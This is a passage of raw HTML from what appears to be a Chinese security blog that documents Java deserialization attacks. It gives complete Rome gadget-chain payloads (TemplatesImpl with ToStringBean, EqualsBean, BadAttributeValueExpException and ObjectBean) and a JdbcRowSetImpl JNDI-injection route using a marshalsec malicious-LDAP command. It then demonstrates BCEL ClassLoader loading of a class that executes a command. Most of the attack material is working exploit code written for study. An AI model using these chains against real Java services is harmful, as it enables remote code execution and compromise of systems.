class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(equalsBean, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508164210620.png" alt="image-20230508164210620"></p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>BadAttributeValueExpException 曾在 cc 链中出现过, 它的 readObject 方法也会调用 toString</p><p><img src="../images/image-20230508165124096.png" alt="image-20230508165124096"></p><p>valObj 从自身的 val 属性获取, 之后进入 if 判断, 这里的触发条件其实是 <code>System.getSecurityManager() == null</code>, 即未开启 Java 安全管理器, 最后调用 valObj.toString()</p><p><img src="../images/image-20230508165459463.png" alt="image-20230508165459463"></p><p>这里的val可控，所以valObj也可控</p><p><strong>利用链</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">BadAttributeValueExpException.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setFieldValue(<span class="string">&quot;val&quot;</span>, toStringBean, e);</span><br><span class="line"></span><br><span class="line">        Serialization.test(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508165611024.png" alt="image-20230508165611024"></p><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p>ysoserial 链用的就是 ObjectBean</p><p>就是和我们文章刚开始的时候分析的一样</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(objectBean2, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h2><p>这个其实我们在之前的文章，也就是西湖论剑的easy_api里提到过，一个拿来当跳板的类，这个类有equals方法，可以触发Xstring的toString，那么也就可以接上Rome的后半段</p><p>这里的话需要导入一个maven</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.12&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508171236938.png" alt="image-20230508171236938"></p><p>这边的流程也很简单，首先入口还是hashmap，里面的putval函数调用了equals，然后key可控，然后就到了HotSwappableTargetSource里面的equals</p><p><img src="../images/image-20230508171756171.png" alt="image-20230508171756171"></p><p><strong>target：左边的是h2右边equals里面的是h1</strong></p><p>这里的target就是xstring，右边里面的内容就是ToStringBean，随之进入Xstring的equals方法里</p><p><img src="../images/image-20230508172034808.png" alt="image-20230508172034808"></p><p>然后这里的obj2就是前面右边的target，就是toStringBean</p><p>obj2就是ToStringBean，因此链子闭合，逻辑无误</p><p>然后链子就构造完成了</p><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>这个类是在FastJson反序列化里见到的一个类，这个类中调用了lookup方法，因此可以进行JNDI注入，所以JDK版本也要注意一下，jdl8的话要小于191版本<br>这个类的入口点是在一个get方法上<code>JdbcRowSetImpl.getDatabaseMetaData()</code>,而rome链中又可以调用任意get方法，那其实也就和TempaltesImpl链思路是一样的，只是在不能使用TempaltesImpl时可以进行替换<br>这里介绍一个工具，marashalsec，用来起恶意ldap和rmi服务端的一个工具，很方便<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [http://](http://127.0.0.1:8888/#EXP)localhost:8888/#Exploit 9999</code><br>在8888端口放上你的payload，这里就准备一个弹计算机的，名字改为Exploit</p>]]></content>
      
      
      
        <tags>
            
            <tag> java反序列化-Rome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全之BCEL ClassLoader</title>
      <link href="/posts/30ead299.html"/>
      <url>/posts/30ead299.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">参考文章</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BCEL平常在测试反序列化的时候也经常会用到，比如延时测Gadget以及在某些场景下执行命令不是那么顺手的情况下选择BCEL去打内存马，就像Fastjson和Thymeleaf SSTI这种。以前也只是用到这个BCEL但是没有仔细学习过，下面简单学习记录下BCEL。</p><h1 id="Java安全之BCEL-ClassLoader"><a href="#Java安全之BCEL-ClassLoader" class="headerlink" title="Java安全之BCEL ClassLoader"></a>Java安全之BCEL ClassLoader</h1><p>目录</p><ul><li>Java安全之BCEL ClassLoader<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#写在前面">写在前面</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">About BCEL</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#调试分析">调试分析</a></li><li>食用姿势<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fuzz反序列化gadget">Fuzz反序列化Gadget</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fastjson-bcel-payload">Fastjson BCEL Payload</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#thymeleaf-ssti-payload">Thymeleaf SSTI Payload</a></li></ul></li></ul></li></ul><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面#"></a>写在前面<a href="https://www.cnblogs.com/CoLo/p/15869871.html#写在前面">#</a></h2><p>BCEL平常在测试反序列化的时候也经常会用到，比如延时测Gadget以及在某些场景下执行命令不是那么顺手的情况下选择BCEL去打内存马，就像Fastjson和Thymeleaf SSTI这种。以前也只是用到这个BCEL但是没有仔细学习过，下面简单学习记录下BCEL。</p><h2 id="About-BCEL"><a href="#About-BCEL" class="headerlink" title="About BCEL"></a>About BCEL</h2><p>BCEL Classloader在 JDK &lt; 8u251之前是在rt.jar里面。<br>同时在Tomcat中也会存在相关的依赖<br>tomcat7</p><p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>tomcat8及其以后</p><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>而在<code>rt.jar!/com/sun/org/apache/bcel/internal/util/</code>包下，有<code>Classloader</code>这么一个类，可以实现加载字节码并初始化一个类的功能，该类也是个Classloader（继承了原生的Classloader类）重写了<code>loadClass()</code>方法，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先会判断类名是否以$$$BCEL$$$开头，之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>先来看下简单的使用，在同一包下，准备一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>准备一个BCEL的demo,运行即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">         <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">         <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">         System.out.println(code);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425210508013.png" alt="image-20230425210508013"></p><p>这样就成功弹其计算器了</p><p>进入loadClass(),首先会判断类名是否以$$$BCEL$$$开头，之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><p><strong>这里原因就是刚开始对loadClass的分析</strong></p><p>那么我们就进行断点调试跟一下</p><p><img src="../images/image-20230425211759344.png" alt="image-20230425211759344"></p><p>这里由于我们前面给文件头加了个BCEl字节码，于是这里就可以进入createClass()</p><p><strong>createClass源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">  <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    clazz = parser.parse();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">  <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">  <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Class);</span><br><span class="line">  <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Utf8);</span><br><span class="line">  name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span 